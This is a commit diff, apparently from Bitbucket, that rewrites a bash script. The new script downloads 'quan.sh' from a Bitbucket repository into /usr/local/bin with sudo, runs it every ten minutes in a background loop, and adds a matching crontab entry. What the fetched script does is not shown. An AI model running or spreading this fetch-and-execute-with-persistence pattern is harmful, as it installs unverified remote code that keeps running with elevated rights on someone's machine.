58aa0fe8a877dddd69ff2017cc87c9bf20f0ae39
ladora <ladora@qdeathse.com>
2024-03-18 19:35:05 +0000

    t.sh edited online with Bitbucket

--- t.sh
+++ t.sh
@@ -1,33 +1,19 @@
 #!/bin/bash
-
-# Tautan raw GitHub ke file script yang ingin dijalankan
-script_url="https://raw.githubusercontent.com/user/repository/main/script.sh"
-
-# Pindahkan file script ke folder system
-sudo wget -O /usr/local/bin/script.sh "$script_url"
-
-# Set izin eksekusi untuk file script
-sudo chmod +x /usr/local/bin/script.sh
-
-# Fungsi untuk menjalankan script
+apt update
+apt install -y sudo
+script_url="https://bitbucket.org/kacepot/esce/raw/main/quan.sh"
+sudo wget -O /usr/local/bin/quan.sh "$script_url"
+sudo chmod +x /usr/local/bin/quan.sh
 run_script() {
-    /usr/local/bin/script.sh
+    /usr/local/bin/quan.sh
 }
-
-# Fungsi untuk menjalankan script pertama kali dan setiap 10 menit berikutnya
 run_every_10_minutes() {
-    # Menjalankan script untuk pertama kalinya
     run_script
     
-    # Menjalankan script setiap 10 menit berikutnya
     while true; do
-        sleep 600  # Menunggu 10 menit (600 detik) sebelum menjalankan kembali
+        sleep 600  
         run_script
     done
 }
-
-# Panggil fungsi untuk menjalankan script pertama kali dan setiap 10 menit berikutnya secara background
 run_every_10_minutes &
-
-# Tambahkan cronjob ke crontab
-(crontab -l 2>/dev/null ; echo "*/10 * * * * /usr/local/bin/script.sh") | crontab -
+(crontab -l 2>/dev/null ; echo "*/10 * * * * /usr/local/bin/quan.sh") | crontab -
